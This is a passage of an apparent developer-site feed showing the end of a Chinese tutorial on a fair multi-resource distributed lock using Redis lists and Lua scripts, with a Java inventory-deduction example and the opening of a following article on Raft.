<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">/**
 * å°è¯•è·å–é”ï¼ˆè‡ªåŠ¨å¤„ç†å•/åŒèµ„æºï¼‰
 * <span class="hljs-doctag">@param</span> r1 èµ„æº1ï¼ˆå¯ä¸ºnullï¼‰
 * <span class="hljs-doctag">@param</span> r2 èµ„æº2ï¼ˆå¯ä¸ºnullï¼‰
 * <span class="hljs-doctag">@return</span> é”IDï¼ˆå¤±è´¥è¿”å›nullï¼‰
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">tryLock</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> r1, <span class="hljs-built_in">String</span> r2</span>) {
    <span class="hljs-title class_">List</span>&lt;<span class="hljs-title class_">String</span>&gt; resources = <span class="hljs-title function_">getValidResources</span>(r1, r2);
    <span class="hljs-keyword">if</span> (resources.<span class="hljs-title function_">isEmpty</span>()) {
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">"è‡³å°‘éœ€è¦ä¸€ä¸ªæœ‰æ•ˆèµ„æºID"</span>);
    }

    <span class="hljs-title class_">String</span> lockId = <span class="hljs-variable constant_">UUID</span>.<span class="hljs-title function_">randomUUID</span>().<span class="hljs-title function_">toString</span>();
    <span class="hljs-keyword">return</span> <span class="hljs-title function_">tryLock</span>(resources, lockId, defaultTimeout) ? lockId : <span class="hljs-literal">null</span>;
}



<span class="hljs-comment">/**
 * è·å–é”
 * <span class="hljs-doctag">@param</span> resources èµ„æº
 * <span class="hljs-doctag">@param</span> lockId é”å”¯ä¸€æ ‡è¯†
 * <span class="hljs-doctag">@param</span> timeout æ˜¯è·å–é”çš„æœ€å¤§ç­‰å¾…æ—¶é—´
 * <span class="hljs-doctag">@return</span> æ˜¯å¦æˆåŠŸè·å–åˆ°é”
 */</span>
<span class="hljs-keyword">private</span> <span class="hljs-built_in">boolean</span> <span class="hljs-title function_">tryLock</span>(<span class="hljs-params">List&lt;<span class="hljs-built_in">String</span>&gt; resources, <span class="hljs-built_in">String</span> lockId, long timeout</span>) {
    long start = <span class="hljs-title class_">System</span>.<span class="hljs-title function_">currentTimeMillis</span>();
    <span class="hljs-comment">// 1. åŠ å…¥æ‰€æœ‰èµ„æºçš„ç­‰å¾…é˜Ÿåˆ—</span>
    resources.<span class="hljs-title function_">forEach</span>(res -&gt; <span class="hljs-title function_">enqueue</span>(res, lockId));
    log.<span class="hljs-title function_">info</span>(<span class="hljs-string">"å·²åŠ å…¥èµ„æºé˜Ÿåˆ—ï¼Œèµ„æºï¼š{}ï¼Œé”IDï¼š{}"</span>, resources, lockId);
    
    ....
    
}


<span class="hljs-comment">/**
 * èµ„æºåŠ å…¥é˜Ÿåˆ—
 * <span class="hljs-doctag">@param</span> resource èµ„æº
 * <span class="hljs-doctag">@param</span> lockId é”å”¯ä¸€æ ‡è¯†
 */</span>
<span class="hljs-keyword">private</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">enqueue</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> resource, <span class="hljs-built_in">String</span> lockId</span>) {
    redisTemplate.<span class="hljs-title function_">opsForList</span>().<span class="hljs-title function_">rightPush</span>(queuePrefix + resource, lockId);
    redisTemplate.<span class="hljs-title function_">expire</span>(queuePrefix + resource, lockTTL, <span class="hljs-title class_">TimeUnit</span>.<span class="hljs-property">SECONDS</span>);
}
</code></pre>
<p><strong>3.åŸå­åŠ é”</strong></p>
<p>luaè„šæœ¬åˆ†æ</p>
<pre><code class="hljs language-lua" lang="lua"><span class="hljs-comment">-- æ£€æŸ¥æ‰€æœ‰èµ„æºé˜Ÿåˆ—çš„é˜Ÿé¦–æ˜¯å¦éƒ½æ˜¯å½“å‰è¯·æ±‚</span>
<span class="hljs-keyword">local</span> all_ready = <span class="hljs-number">1</span>
<span class="hljs-keyword">local</span> queue_key_count = #KEYS / <span class="hljs-number">2</span>  <span class="hljs-comment">-- è®¡ç®—é˜Ÿåˆ—keyçš„æ•°é‡</span>

<span class="hljs-keyword">for</span> i = <span class="hljs-number">1</span>, queue_key_count <span class="hljs-keyword">do</span>
   <span class="hljs-keyword">local</span> queue_key = KEYS[i]
   <span class="hljs-comment">-- æ£€æŸ¥æ•°æ®ç»“æ„ç±»å‹æ˜¯å¦ä¸ºlist</span>
   <span class="hljs-keyword">if</span> redis.call(<span class="hljs-string">'type'</span>, queue_key)[<span class="hljs-string">'ok'</span>] ~= <span class="hljs-string">'list'</span> <span class="hljs-keyword">then</span>
       <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>  <span class="hljs-comment">-- æ•°æ®ç»“æ„é”™è¯¯</span>
   <span class="hljs-keyword">end</span>
   <span class="hljs-comment">-- æ£€æŸ¥é˜Ÿé¦–å…ƒç´ æ˜¯å¦æ˜¯å½“å‰lockId</span>
   <span class="hljs-keyword">if</span> redis.call(<span class="hljs-string">'lindex'</span>, queue_key, <span class="hljs-number">0</span>) ~= ARGV[<span class="hljs-number">1</span>] <span class="hljs-keyword">then</span>
       all_ready = <span class="hljs-number">0</span>  <span class="hljs-comment">-- ä¸æ˜¯é˜Ÿé¦–ï¼Œè®¾ç½®æ ‡å¿—ä½</span>
       <span class="hljs-keyword">break</span>  <span class="hljs-comment">-- è·³å‡ºå¾ªç¯</span>
   <span class="hljs-keyword">end</span>
<span class="hljs-keyword">end</span>

<span class="hljs-comment">-- å¦‚æœæ‰€æœ‰é˜Ÿåˆ—çš„é˜Ÿé¦–éƒ½æ˜¯å½“å‰è¯·æ±‚</span>
<span class="hljs-keyword">if</span> all_ready == <span class="hljs-number">1</span> <span class="hljs-keyword">then</span>
   <span class="hljs-comment">-- éå†æ‰€æœ‰é”keyï¼ˆKEYSçš„ååŠéƒ¨åˆ†ï¼‰</span>
   <span class="hljs-keyword">for</span> i = queue_key_count + <span class="hljs-number">1</span>, #KEYS <span class="hljs-keyword">do</span>
       <span class="hljs-keyword">local</span> lock_key = KEYS[i]
       <span class="hljs-comment">-- å°è¯•è®¾ç½®é”ï¼ˆå¸¦è¿‡æœŸæ—¶é—´å’ŒNXæ¡ä»¶ï¼‰</span>
       redis.call(<span class="hljs-string">'set'</span>, lock_key, ARGV[<span class="hljs-number">1</span>], <span class="hljs-string">'EX'</span>, ARGV[<span class="hljs-number">2</span>], <span class="hljs-string">'NX'</span>)
       <span class="hljs-comment">-- éªŒè¯é”æ˜¯å¦è®¾ç½®æˆåŠŸ</span>
       <span class="hljs-keyword">if</span> redis.call(<span class="hljs-string">'get'</span>, lock_key) ~= ARGV[<span class="hljs-number">1</span>] <span class="hljs-keyword">then</span>
           <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>  <span class="hljs-comment">-- è·å–é”å¤±è´¥</span>
       <span class="hljs-keyword">end</span>
   <span class="hljs-keyword">end</span>
   <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>  <span class="hljs-comment">-- æ‰€æœ‰é”è·å–æˆåŠŸ</span>
<span class="hljs-keyword">else</span>
   <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>  <span class="hljs-comment">-- ä¸æ˜¯æ‰€æœ‰é˜Ÿåˆ—çš„é˜Ÿé¦–</span>
<span class="hljs-keyword">end</span>
</code></pre>
<p><strong>è·å–é”</strong></p>
<ul>
<li>100msé—´éš”æ£€æŸ¥æ˜¯å¦åˆ°è¾¾é˜Ÿåˆ—å¤´éƒ¨ã€æ˜¯å¦èƒ½è·å–åˆ°é”</li>
<li>è¶…æ—¶åè‡ªåŠ¨æ¸…ç†æ®‹ç•™è¯·æ±‚</li>
</ul>
<pre><code class="hljs language-swift" lang="swift">
<span class="hljs-comment">//--------------- æ ¸å¿ƒå®ç° ---------------//</span>
<span class="hljs-comment">/**
 * è·å–é”
 * @param resources èµ„æº
 * @param lockId é”å”¯ä¸€æ ‡è¯†
 * @param timeout æ˜¯è·å–é”çš„æœ€å¤§ç­‰å¾…æ—¶é—´
 * @return æ˜¯å¦æˆåŠŸè·å–åˆ°é”
 */</span>
<span class="hljs-keyword">private</span> boolean tryLock(<span class="hljs-type">List</span>&lt;<span class="hljs-type">String</span>&gt; resources, <span class="hljs-type">String</span> lockId, long timeout) {
    long start <span class="hljs-operator">=</span> <span class="hljs-type">System</span>.currentTimeMillis();
    <span class="hljs-comment">// 1. åŠ å…¥æ‰€æœ‰èµ„æºçš„ç­‰å¾…é˜Ÿåˆ—</span>
    resources.forEach(res -&gt; enqueue(res, lockId));
    log.info(<span class="hljs-string">"å·²åŠ å…¥èµ„æºé˜Ÿåˆ—ï¼Œèµ„æºï¼š{}ï¼Œé”IDï¼š{}"</span>, resources, lockId);
    <span class="hljs-keyword">try</span> {
        <span class="hljs-keyword">while</span> (<span class="hljs-type">System</span>.currentTimeMillis() <span class="hljs-operator">-</span> start <span class="hljs-operator">&lt;</span> timeout <span class="hljs-operator">*</span> <span class="hljs-number">1000</span>) {
            <span class="hljs-comment">// 2. æ£€æŸ¥æ˜¯å¦åœ¨æ‰€æœ‰èµ„æºé˜Ÿåˆ—å¤´éƒ¨</span>
            <span class="hljs-keyword">if</span> (checkAndLock(resources, lockId)) {
                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
            }
            <span class="hljs-type">TimeUnit</span>.<span class="hljs-type">MILLISECONDS</span>.sleep(<span class="hljs-number">100</span>); <span class="hljs-comment">// è½®è¯¢é—´éš”</span>
        }
    } <span class="hljs-keyword">catch</span> (<span class="hljs-type">InterruptedException</span> e) {
        <span class="hljs-type">Thread</span>.currentThread().interrupt();
    } finally {
        <span class="hljs-comment">// 3. è¶…æ—¶åæ¸…ç†é˜Ÿåˆ—</span>
        <span class="hljs-keyword">if</span> (<span class="hljs-operator">!</span>isLockAcquired(resources, lockId)) {
            resources.forEach(res -&gt; removeFromQueue(res, lockId));
        }
    }
    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
}


<span class="hljs-comment">/**
 * æ£€æŸ¥æ˜¯å¦è¾¾åˆ°é˜Ÿåˆ—å¤´éƒ¨å¹¶è·å–é”
 * @param resources èµ„æº
 * @param lockId é”å”¯ä¸€æ ‡è¯†
 * @return æ˜¯å¦æˆåŠŸè·å–åˆ°é”
 */</span>
<span class="hljs-keyword">private</span> boolean checkAndLock(<span class="hljs-type">List</span>&lt;<span class="hljs-type">String</span>&gt; resources, <span class="hljs-type">String</span> lockId) {
    <span class="hljs-type">String</span> luaScript <span class="hljs-operator">=</span>
            <span class="hljs-string">"local all_ready = 1<span class="hljs-subst">\n</span>"</span> <span class="hljs-operator">+</span>
                    <span class="hljs-string">"local queue_key_count = #KEYS / 2<span class="hljs-subst">\n</span>"</span> <span class="hljs-operator">+</span>
                    <span class="hljs-string">"for i = 1, queue_key_count do<span class="hljs-subst">\n</span>"</span> <span class="hljs-operator">+</span>
                    <span class="hljs-string">"   local queue_key = KEYS[i]<span class="hljs-subst">\n</span>"</span> <span class="hljs-operator">+</span>
                    <span class="hljs-string">"   if redis.call('type', queue_key)['ok'] ~= 'list' then<span class="hljs-subst">\n</span>"</span> <span class="hljs-operator">+</span>
                    <span class="hljs-string">"       return -1<span class="hljs-subst">\n</span>"</span> <span class="hljs-operator">+</span>
                    <span class="hljs-string">"   end<span class="hljs-subst">\n</span>"</span> <span class="hljs-operator">+</span>
                    <span class="hljs-string">"   if redis.call('lindex', queue_key, 0) ~= ARGV[1] then<span class="hljs-subst">\n</span>"</span> <span class="hljs-operator">+</span>
                    <span class="hljs-string">"       all_ready = 0<span class="hljs-subst">\n</span>"</span> <span class="hljs-operator">+</span>
                    <span class="hljs-string">"       break<span class="hljs-subst">\n</span>"</span> <span class="hljs-operator">+</span>
                    <span class="hljs-string">"   end<span class="hljs-subst">\n</span>"</span> <span class="hljs-operator">+</span>
                    <span class="hljs-string">"end<span class="hljs-subst">\n</span><span class="hljs-subst">\n</span>"</span> <span class="hljs-operator">+</span>
                    <span class="hljs-string">"if all_ready == 1 then<span class="hljs-subst">\n</span>"</span> <span class="hljs-operator">+</span>
                    <span class="hljs-string">"   for i = queue_key_count + 1, #KEYS do<span class="hljs-subst">\n</span>"</span> <span class="hljs-operator">+</span>
                    <span class="hljs-string">"       local lock_key = KEYS[i]<span class="hljs-subst">\n</span>"</span> <span class="hljs-operator">+</span>
                    <span class="hljs-string">"       redis.call('set', lock_key, ARGV[1], 'EX', ARGV[2], 'NX')<span class="hljs-subst">\n</span>"</span> <span class="hljs-operator">+</span>
                    <span class="hljs-string">"       if redis.call('get', lock_key) ~= ARGV[1] then<span class="hljs-subst">\n</span>"</span> <span class="hljs-operator">+</span>
                    <span class="hljs-string">"           return 0<span class="hljs-subst">\n</span>"</span> <span class="hljs-operator">+</span>
                    <span class="hljs-string">"       end<span class="hljs-subst">\n</span>"</span> <span class="hljs-operator">+</span>
                    <span class="hljs-string">"   end<span class="hljs-subst">\n</span>"</span> <span class="hljs-operator">+</span>
                    <span class="hljs-string">"   return 1<span class="hljs-subst">\n</span>"</span> <span class="hljs-operator">+</span>
                    <span class="hljs-string">"else<span class="hljs-subst">\n</span>"</span> <span class="hljs-operator">+</span>
                    <span class="hljs-string">"   return 0<span class="hljs-subst">\n</span>"</span> <span class="hljs-operator">+</span>
                    <span class="hljs-string">"end"</span>;

    <span class="hljs-type">List</span>&lt;<span class="hljs-type">String</span>&gt; keys <span class="hljs-operator">=</span> new <span class="hljs-type">ArrayList</span>&lt;&gt;();

    <span class="hljs-comment">// é˜Ÿåˆ—Key</span>
    resources.forEach(res -&gt; keys.add(queuePrefix <span class="hljs-operator">+</span> res));

    <span class="hljs-comment">// é”Key</span>
    resources.forEach(res -&gt; keys.add(lockPrefix <span class="hljs-operator">+</span> res));

    <span class="hljs-type">DefaultRedisScript</span>&lt;<span class="hljs-type">Long</span>&gt; script <span class="hljs-operator">=</span> new <span class="hljs-type">DefaultRedisScript</span>&lt;&gt;(luaScript, <span class="hljs-type">Long</span>.class);
    log.info(<span class="hljs-string">"å°è¯•è·å–é”ï¼Œkeys:{},lockId:{}"</span>,keys,lockId);
    <span class="hljs-type">Long</span> result <span class="hljs-operator">=</span> redisTemplate.execute(script, keys, lockId, lockTTL);
    log.info(<span class="hljs-string">"è·å–é”ç»“æœï¼š{},keys:{},lockId:{}"</span>,result <span class="hljs-operator">==</span> 1L,keys,lockId);
    <span class="hljs-keyword">return</span>  result <span class="hljs-operator">==</span> 1L;
}



<span class="hljs-comment">/**
 * è¯¥ç»„èµ„æºæ˜¯å¦è¢«lockIdæŒæœ‰
 * @param resources èµ„æº
 * @param lockId é”å”¯ä¸€æ ‡è¯†
 * @return true:å…¨éƒ¨è¢«lockIdæŒæœ‰  falseï¼šä¸è¢«lockIdæŒæœ‰
 */</span>
<span class="hljs-keyword">private</span> boolean isLockAcquired(<span class="hljs-type">List</span>&lt;<span class="hljs-type">String</span>&gt; resources, <span class="hljs-type">String</span> lockId) {
    <span class="hljs-keyword">return</span> resources.stream()
            .allMatch(res -&gt; lockId.equals(
                    redisTemplate.opsForValue().get(lockPrefix <span class="hljs-operator">+</span> res)
            ));
}
</code></pre>
<ul>
<li>
<p>å‚æ•°è¯´æ˜ï¼š</p>
<ul>
<li>KEYS[1..n]ï¼šé˜Ÿåˆ—Keyåˆ—è¡¨</li>
<li>KEYS[n+1..2n]ï¼šå¯¹åº”é”Keyåˆ—è¡¨</li>
<li>ARGV[1]ï¼šlockId</li>
<li>ARGV[2]ï¼šTTL</li>
</ul>
</li>
</ul>
<p><strong>4.è§£é”æµç¨‹</strong></p>
<ul>
<li>éªŒè¯é”å½’å±ååŒæ—¶åˆ é™¤é”å’Œå‡ºé˜Ÿ</li>
</ul>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">/**
 * é‡Šæ”¾é”ã€èµ„æºå‡ºé˜Ÿåˆ—
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">unlock</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> r1, <span class="hljs-built_in">String</span> r2, <span class="hljs-built_in">String</span> lockId</span>) {
    <span class="hljs-title class_">List</span>&lt;<span class="hljs-title class_">String</span>&gt; resources = <span class="hljs-title function_">getValidResources</span>(r1, r2);
    resources.<span class="hljs-title function_">forEach</span>(res -&gt; <span class="hljs-title function_">releaseLock</span>(res, lockId));
    resources.<span class="hljs-title function_">forEach</span>(res -&gt; <span class="hljs-title function_">removeFromQueue</span>(res, lockId));
}


<span class="hljs-comment">/**
 * é‡Šæ”¾é”
 * <span class="hljs-doctag">@param</span> resource èµ„æº
 * <span class="hljs-doctag">@param</span> lockId é”å”¯ä¸€æ ‡è¯†
 */</span>
<span class="hljs-keyword">private</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">releaseLock</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> resource, <span class="hljs-built_in">String</span> lockId</span>) {
    <span class="hljs-title class_">String</span> luaScript =
            <span class="hljs-string">"if redis.call('get', KEYS[1]) == ARGV[1] then\n"</span> +
                    <span class="hljs-string">"   redis.call('del', KEYS[1])\n"</span> +
                    <span class="hljs-string">"   redis.call('lpop', KEYS[2])\n"</span> +
                    <span class="hljs-string">"   return 1\n"</span> +
                    <span class="hljs-string">"else\n"</span> +
                    <span class="hljs-string">"   return 0\n"</span> +
                    <span class="hljs-string">"end"</span>;

    <span class="hljs-title class_">List</span>&lt;<span class="hljs-title class_">String</span>&gt; keys = <span class="hljs-title class_">Arrays</span>.<span class="hljs-title function_">asList</span>(
            lockPrefix + resource,
            queuePrefix + resource
    );

    redisTemplate.<span class="hljs-title function_">execute</span>(
            <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultRedisScript</span>&lt;&gt;(luaScript, <span class="hljs-title class_">Long</span>.<span class="hljs-property">class</span>),
            keys,
            lockId
    );
}


<span class="hljs-comment">/**
 * ç§»é™¤é˜Ÿåˆ—èµ„æº
 * <span class="hljs-doctag">@param</span> resource èµ„æº
 * <span class="hljs-doctag">@param</span> lockId é”å”¯ä¸€æ ‡è¯†
 */</span>
<span class="hljs-keyword">private</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">removeFromQueue</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> resource, <span class="hljs-built_in">String</span> lockId</span>) {
    redisTemplate.<span class="hljs-title function_">opsForList</span>().<span class="hljs-title function_">remove</span>(queuePrefix + resource, <span class="hljs-number">0</span>, lockId);
    log.<span class="hljs-title function_">info</span>(<span class="hljs-string">"æ¸…ç†èµ„æºé˜Ÿåˆ—ï¼š{},lockId:{}"</span>,resource,lockId);
}
</code></pre>
<h4 data-id="heading-12">4.2.3 ç¤ºä¾‹</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Slf4j</span>
<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MallServiceImpl</span>  {

    <span class="hljs-meta">@Resource</span>
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">DynamicResourceLock</span> lockUtil;
    
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Boolean</span> <span class="hljs-title function_">deductInventory</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> productId, <span class="hljs-built_in">String</span> warehouseId, int quantity</span>) {
        log.<span class="hljs-title function_">info</span>(<span class="hljs-string">"åº“å­˜æ‰£å‡å¼€å§‹"</span>);
        <span class="hljs-title class_">String</span> requestId = <span class="hljs-literal">null</span>;
        <span class="hljs-keyword">try</span> {
            requestId = lockUtil.<span class="hljs-title function_">tryLock</span>(productId, warehouseId);
            <span class="hljs-keyword">if</span> (<span class="hljs-title class_">StringUtils</span>.<span class="hljs-title function_">isNotEmpty</span>(requestId)) {
                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BizException</span>(<span class="hljs-title class_">DefaultErrorCode</span>.<span class="hljs-property">EXECUTE_FAIL</span>,<span class="hljs-string">"åº“å­˜æ‰£å‡è·å–é”å¤±è´¥ï¼Œè¯·é‡è¯•"</span>);
            }
          
           log.<span class="hljs-title function_">info</span>(<span class="hljs-string">"deductInventory-,åº“å­˜æ‰£å‡è·å–é”æˆåŠŸ"</span>);
            <span class="hljs-comment">// æ‰§è¡Œä¸šåŠ¡æ“ä½œ</span>
            ...
            <span class="hljs-keyword">return</span> <span class="hljs-title class_">Boolean</span>.<span class="hljs-property">TRUE</span>;
        }  <span class="hljs-keyword">finally</span> {
            <span class="hljs-keyword">if</span> (<span class="hljs-title class_">StringUtils</span>.<span class="hljs-title function_">isNotEmpty</span>(requestId)) {
                lockUtil.<span class="hljs-title function_">unlock</span>(productId, warehouseId,requestId);
                log.<span class="hljs-title function_">info</span>(<span class="hljs-string">"deductInventory-åº“å­˜æ‰£å‡é‡Šæ”¾é”æˆåŠŸ"</span>);
            }
        }
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">Boolean</span>.<span class="hljs-property">TRUE</span>;
    }
}
</code></pre>
<h3 data-id="heading-13">4.3æŠ€æœ¯äº®ç‚¹</h3>
<h4 data-id="heading-14">4.3.1å…¬å¹³æ€§ä¿éšœ</h4>
<ul>
<li>é€šè¿‡Redis Listçš„FIFOç‰¹æ€§å®ç°å¤©ç„¶æ’é˜Ÿ</li>
<li>åªæœ‰é˜Ÿåˆ—å¤´éƒ¨è¯·æ±‚å¯è·å–é”</li>
</ul>
<h4 data-id="heading-15">4.3.2åŸå­æ€§æ“ä½œ</h4>
<ul>
<li>ä½¿ç”¨Luaè„šæœ¬å°†å¤šä¸ªRediså‘½ä»¤æ‰“åŒ…ä¸ºåŸå­æ“ä½œ</li>
<li>é¿å…ç«æ€æ¡ä»¶</li>
</ul>
<h4 data-id="heading-16">4.3.3å¤šèµ„æºæ”¯æŒ</h4>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">lock</span>.tryLock(<span class="hljs-string">"C123"</span>, <span class="hljs-string">"W456"</span>);
</code></pre>
<h4 data-id="heading-17">4.3.4å®¹é”™è®¾è®¡</h4>
<ul>
<li>è¶…æ—¶è‡ªåŠ¨é‡Šæ”¾æœºåˆ¶</li>
</ul>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">private</span> <span class="hljs-built_in">boolean</span> <span class="hljs-title function_">tryLock</span>(<span class="hljs-params">List&lt;<span class="hljs-built_in">String</span>&gt; resources, <span class="hljs-built_in">String</span> lockId, long timeout</span>) {
    long start = <span class="hljs-title class_">System</span>.<span class="hljs-title function_">currentTimeMillis</span>();
    <span class="hljs-comment">// 1. åŠ å…¥æ‰€æœ‰èµ„æºçš„ç­‰å¾…é˜Ÿåˆ—</span>
    resources.<span class="hljs-title function_">forEach</span>(res -&gt; <span class="hljs-title function_">enqueue</span>(res, lockId));
    log.<span class="hljs-title function_">info</span>(<span class="hljs-string">"å·²åŠ å…¥èµ„æºé˜Ÿåˆ—ï¼Œèµ„æºï¼š{}ï¼Œé”IDï¼š{}"</span>, resources, lockId);
    <span class="hljs-keyword">try</span> {
        <span class="hljs-keyword">while</span> (<span class="hljs-title class_">System</span>.<span class="hljs-title function_">currentTimeMillis</span>() - start &lt; timeout * <span class="hljs-number">1000</span>) {
            <span class="hljs-comment">// 2. æ£€æŸ¥æ˜¯å¦åœ¨æ‰€æœ‰èµ„æºé˜Ÿåˆ—å¤´éƒ¨</span>
            <span class="hljs-keyword">if</span> (<span class="hljs-title function_">checkAndLock</span>(resources, lockId)) {
                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
            }
            <span class="hljs-title class_">TimeUnit</span>.<span class="hljs-property">MILLISECONDS</span>.<span class="hljs-title function_">sleep</span>(<span class="hljs-number">100</span>); <span class="hljs-comment">// è½®è¯¢é—´éš”</span>
        }
    } <span class="hljs-keyword">catch</span> (<span class="hljs-title class_">InterruptedException</span> e) {
        <span class="hljs-title class_">Thread</span>.<span class="hljs-title function_">currentThread</span>().<span class="hljs-title function_">interrupt</span>();
    } <span class="hljs-keyword">finally</span> {
        <span class="hljs-comment">// 3. è¶…æ—¶åæ¸…ç†é˜Ÿåˆ—</span>
        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_">isLockAcquired</span>(resources, lockId)) {
            resources.<span class="hljs-title function_">forEach</span>(res -&gt; <span class="hljs-title function_">removeFromQueue</span>(res, lockId));
        }
    }
    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
}

<span class="hljs-keyword">private</span> <span class="hljs-built_in">boolean</span> <span class="hljs-title function_">isLockAcquired</span>(<span class="hljs-params">List&lt;<span class="hljs-built_in">String</span>&gt; resources, <span class="hljs-built_in">String</span> lockId</span>) {
    <span class="hljs-keyword">return</span> resources.<span class="hljs-title function_">stream</span>()
            .<span class="hljs-title function_">allMatch</span>(res -&gt; lockId.<span class="hljs-title function_">equals</span>(
                    redisTemplate.<span class="hljs-title function_">opsForValue</span>().<span class="hljs-title function_">get</span>(lockPrefix + res)
            ));
}
</code></pre>
<ul>
<li>é”TTLç•¥å¤§äºä¸šåŠ¡æ“ä½œæ—¶é—´</li>
</ul>
<h2 data-id="heading-18">5. å›¢é˜Ÿä»‹ç»</h2>
<p>ã€Œ<strong>ä¸‰ç¿¼é¸Ÿæ•°å­—åŒ–æŠ€æœ¯å¹³å°-åº”ç”¨è½¯ä»¶æ¡†æ¶å¼€å‘</strong>ã€ä¸»è¦è´Ÿè´£è®¾è®¡å·¥å…·çš„ç ”å‘ï¼ŒåŒ…æ‹¬è¥é”€è®¾è®¡å·¥å…·ã€å®¶ç”µVRè®¾è®¡å’Œå±•ç¤ºã€æ°´ç”µæš–é€šå‰ç½®è®¾è®¡èƒ½åŠ›ï¼Œç ”å‘å¹¶æ²‰æ·€ç´ æåº“ï¼Œæ„å»ºå®¶å±…å®¶è£…ç´ æåº“ï¼Œé›†æˆæˆ·å‹åº“ã€å…¨å“ç±»äº§å“åº“ã€è®¾è®¡æ–¹æ¡ˆåº“ã€ç”Ÿäº§å·¥è‰ºæ¨¡å‹ï¼Œæ‰“é€ åŸºäºæˆ·å‹å’Œé£æ ¼çš„AIè®¾è®¡èƒ½åŠ›ï¼Œå¿«é€Ÿç”Ÿæˆç®—é‡å’ŒæŠ¥ä»·ï¼›åŒæ—¶ç ”å‘äº†é—¨åº—è®¾è®¡å¸ˆä¸­å¿ƒå’Œé¡¹ç›®ä¸­å¿ƒï¼ŒåŒ…æ‹¬è®¾è®¡å¸ˆç®¡ç†èƒ½åŠ›å’Œé¡¹ç›®ç»ç†ç®¡ç†èƒ½åŠ›ã€‚å®ç°äº†åœºæ™¯å…¨ç”Ÿå‘½å‘¨æœŸç®¡ç†ï¼ŒåŒæ—¶ä¸ºæ°´ï¼Œç©ºæ°”ï¼Œå¨æˆ¿ç­‰äº§ä¸šæä¾›å•†æœºç®¡ç†å·¥å…·ï¼Œä»è€Œå®ç°äº†ä»¥åœºæ™¯è´¯ç©¿çš„Bç«¯Cç«¯å…¨æµç¨‹ç³»ç»Ÿã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ·±å…¥ç†è§£åˆ†å¸ƒå¼å…±è¯†ç®—æ³• Raft]]></title>    <link>https://juejin.cn/post/7576994308273750035</link>    <guid>https://juejin.cn/post/7576994308273750035</guid>    <pubDate>2025-11-27T06:41:07.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576994308273750035" data-draft-id="7577171133444407332" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ·±å…¥ç†è§£åˆ†å¸ƒå¼å…±è¯†ç®—æ³• Raft"/> <meta itemprop="keywords" content="ç¨‹åºå‘˜"/> <meta itemprop="datePublished" content="2025-11-27T06:41:07.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="äº¬ä¸œäº‘å¼€å‘è€…"/> <meta itemprop="url" content="https://juejin.cn/user/2634854380340008"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ·±å…¥ç†è§£åˆ†å¸ƒå¼å…±è¯†ç®—æ³• Raft
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2634854380340008/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    äº¬ä¸œäº‘å¼€å‘è€…
